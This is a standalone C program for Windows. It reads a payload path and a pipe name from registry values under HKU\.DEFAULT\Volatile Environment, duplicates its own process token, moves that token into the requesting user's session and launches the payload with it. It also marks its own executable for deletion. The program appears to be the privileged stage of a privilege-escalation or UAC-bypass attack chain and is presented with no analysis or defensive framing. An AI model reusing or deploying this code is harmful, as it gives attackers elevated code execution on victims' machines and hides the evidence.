#include <windows.h>

typedef NTSTATUS(NTAPI *PNtSetInformationToken)(HANDLE, int, PVOID, ULONG);

int main() {
  SetEnvironmentVariableW(L"windir", L"C:\\Windows");

  WCHAR selfPath[MAX_PATH];
  GetModuleFileNameW(NULL, selfPath, MAX_PATH);
  HANDLE hSelf = CreateFileW(selfPath, DELETE,
      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
      NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
  if (hSelf != INVALID_HANDLE_VALUE) CloseHandle(hSelf);

  HKEY hKey;
  if (RegOpenKeyExW(HKEY_USERS, L".DEFAULT\\Volatile Environment",
                    0, KEY_READ, &hKey) != ERROR_SUCCESS)
    return 1;

  WCHAR pipeName[MAX_PATH];
  DWORD type, size = sizeof(pipeName);
  if (RegQueryValueExW(hKey, L"mp_pipe", NULL, &type,
                       (LPBYTE)pipeName, &size) != ERROR_SUCCESS ||
      type != REG_SZ) {
    RegCloseKey(hKey);
    return 1;
  }

  WCHAR payloadPath[MAX_PATH];
  size = sizeof(payloadPath);
  if (RegQueryValueExW(hKey, L"mp_payload", NULL, &type,
                       (LPBYTE)payloadPath, &size) != ERROR_SUCCESS ||
      type != REG_SZ) {
    RegCloseKey(hKey);
    return 1;
  }
  RegCloseKey(hKey);

  HANDLE hPipe = CreateFileW(pipeName, GENERIC_READ | GENERIC_WRITE, 0,
                              NULL, OPEN_EXISTING, 0, NULL);
  if (hPipe == INVALID_HANDLE_VALUE)
    return 1;

  ULONG sessionId;
  if (!GetNamedPipeServerSessionId(hPipe, &sessionId)) {
    CloseHandle(hPipe);
    return 1;
  }
  CloseHandle(hPipe);

  HANDLE hToken;
  if (!OpenProcessToken(
          GetCurrentProcess(),
          TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY |
              TOKEN_ADJUST_DEFAULT,
          &hToken))
    return 1;

  HANDLE hNewToken;
  if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                         TokenPrimary, &hNewToken)) {
    CloseHandle(hToken);
    return 1;
  }
  CloseHandle(hToken);

  HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
  if (hNtdll) {
    PNtSetInformationToken NtSetInformationToken =
        (PNtSetInformationToken)GetProcAddress(hNtdll,
                                               "NtSetInformationToken");
    if (NtSetInformationToken)
      NtSetInformationToken(hNewToken, 12, &sessionId, sizeof(ULONG));
  }

  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(STARTUPINFOW);

  CreateProcessAsUserW(hNewToken, payloadPath, NULL, NULL, NULL, FALSE, 0,
                        NULL, NULL, &si, &pi);

  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  CloseHandle(hNewToken);
  return 0;
}
